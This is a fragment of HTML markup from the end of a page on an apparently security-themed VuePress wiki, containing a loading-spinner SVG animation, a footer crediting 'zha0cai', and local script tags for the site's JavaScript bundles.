0 1 28 28"><animate attributeName="stroke-opacity" begin="0.1s" dur="1s" keyTimes="0;0.2;1" repeatCount="indefinite" values="0;1;1"></animate></path><path fill="none" stroke="#88baf0" stroke-width="10" d="M28 25a50 50 0 0 1 50 50"><animate attributeName="stroke-opacity" begin="0.2s" dur="1s" keyTimes="0;0.2;1" repeatCount="indefinite" values="0;1;1"></animate></path></svg></div><!--[--><!----><!--]--><!--]--></main><!--]--><footer class="vp-footer-wrapper"><div class="vp-footer">Create by zha0cai</div><div class="vp-copyright">Copyright © 2024 Mr.zha0cai </div></footer></div><!--]--><!--[--><!----><!--]--><!--]--></div>
    <script src="/SecWikiPublic/secwiki/assets/js/runtime~app.ec83fc56.js" defer></script><script src="/SecWikiPublic/secwiki/assets/js/335.d146fa33.js" defer></script><script src="/SecWikiPublic/secwiki/assets/js/app.2bb4161d.js" defer></script>
  </body>
</html>
